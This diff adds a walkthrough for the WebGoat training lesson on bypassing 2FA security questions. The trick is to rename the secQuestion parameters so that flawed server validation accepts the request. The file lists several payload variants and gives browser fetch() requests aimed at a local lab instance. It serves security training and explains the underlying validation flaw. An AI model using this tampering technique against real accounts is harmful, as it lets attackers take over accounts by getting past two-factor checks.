@@ -1,0 +1,151 @@
+====================================================================
+2FA PASSWORD RESET - AUTHENTICATION BYPASS
+====================================================================
+
+CHALLENGE:
+----------
+Bypass 2FA security questions by tampering with parameter names
+
+STORY REFERENCE (PayPal 2016):
+-------------------------------
+Attacker couldn't receive SMS code → Used security questions
+Instead of answering correctly, they REMOVED the parameters entirely
+Server didn't validate → Bypass successful!
+
+YOUR CHALLENGE (Similar but Different):
+----------------------------------------
+✅ DON'T delete parameters
+✅ DO rename them
+❌ Server expects 2 questions but has flawed validation logic
+✅ Trick: Rename secQuestion0 and secQuestion1
+
+====================================================================
+SOLUTION TECHNIQUE:
+====================================================================
+
+NORMAL REQUEST:
+---------------
+POST /verify-account
+secQuestion0=answer1
+secQuestion1=answer2
+
+WHAT TO TRY:
+------------
+1. Rename parameters (e.g., secQuestion2, secQuestion3)
+2. Use wrong parameter names
+3. Make server think questions were answered without validating
+
+KEY INSIGHT:
+------------
+The server checks "Did I receive 2 parameters?"
+But it doesn't properly validate WHICH parameters!
+
+If you send:
+  secQuestion2=anything
+  secQuestion3=anything
+
+Server sees: "I got 2 parameters ✓" (but never validates them!)
+
+====================================================================
+ATTACK PAYLOADS TO TRY:
+====================================================================
+
+OPTION 1: Rename to non-existent question numbers
+--------------------------------------------------
+secQuestion2=whatever
+secQuestion3=whatever
+
+OPTION 2: Use different names
+------------------------------
+secQuestion1=answer
+secQuestion2=answer
+
+OPTION 3: Skip to higher numbers
+---------------------------------
+secQuestion5=test
+secQuestion6=test
+
+OPTION 4: Use wrong indices
+----------------------------
+secQuestionX=answer
+secQuestionY=answer
+
+====================================================================
+HOW TO EXECUTE:
+====================================================================
+
+METHOD 1: Browser DevTools (Intercept & Modify)
+------------------------------------------------
+1. Open WebGoat 2FA lesson
+2. Press F12 → Network tab
+3. Fill ANY answers in the form
+4. Submit the form
+5. Right-click the request → Copy as cURL or Copy as fetch
+6. Edit the parameter names:
+   Change: secQuestion0 → secQuestion2
+   Change: secQuestion1 → secQuestion3
+7. Resend the modified request
+
+METHOD 2: Browser Console (Direct Fetch)
+-----------------------------------------
+IMPORTANT: Include ALL required parameters from the original request!
+
+fetch('http://192.168.254.112:8001/WebGoat/auth-bypass/verify-account', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'secQuestion2=anything&secQuestion3=anything&jsEnabled=1&verifyMethod=SEC_QUESTIONS'
+}).then(r => r.text()).then(console.log);
+
+OR with userId (if needed - get from the form):
+
+fetch('http://192.168.254.112:8001/WebGoat/auth-bypass/verify-account', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'secQuestion2=anything&secQuestion3=anything&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746'
+}).then(r => r.text()).then(console.log);
+
+METHOD 3: Use HTML Attack Tool
+-------------------------------
+Open: auth_bypass_2fa.html (see below)
+
+====================================================================
+EXPECTED RESULT:
+====================================================================
+
+Success Response:
+{
+  "lessonCompleted": true,
+  "feedback": "Congratulations! You bypassed 2FA",
+  "verified": true
+}
+
+====================================================================
+KEY CONCEPTS:
+====================================================================
+
+✅ Parameter Tampering
+✅ Logic Flaw in Validation
+✅ Security by Obscurity Failure
+✅ Incomplete Input Validation
+
+The application checked:
+  ❌ "Are there 2 parameters?" (Bad validation)
+  
+But didn't check:
+  ✓ "Are they the CORRECT parameters?" (Should validate)
+  ✓ "Are the answers correct?" (Should validate)
+
+====================================================================
+VARIATIONS TO TRY:
+====================================================================
+
+If first attempt fails, try:
+1. secQuestion1 and secQuestion2 (skip 0)
+2. secQuestion_0 and secQuestion_1 (underscore)
+3. secQuestion[0] and secQuestion[1] (array notation)
+4. question0 and question1 (shortened name)
+5. Empty values: secQuestion2=&secQuestion3=
+
+====================================================================
